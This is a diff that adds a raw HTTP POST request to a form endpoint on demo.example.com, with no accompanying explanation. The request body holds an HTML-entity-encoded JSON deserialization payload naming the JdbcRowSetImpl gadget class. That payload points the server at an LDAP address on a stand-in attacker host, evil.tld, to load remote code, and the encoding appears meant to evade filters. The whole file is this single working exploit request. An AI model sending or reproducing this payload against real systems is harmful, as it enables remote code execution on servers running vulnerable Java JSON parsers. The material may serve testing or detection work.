@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 148
+Connection: close
+
+q={&#x22;@type&#x22;:&#x22;com.sun.rowset.JdbcRowSetImpl&#x22;,&#x22;dataSourceName&#x22;:&#x22;ldap://evil.tld/x&#x22;,&#x22;autoCommit&#x22;:true}
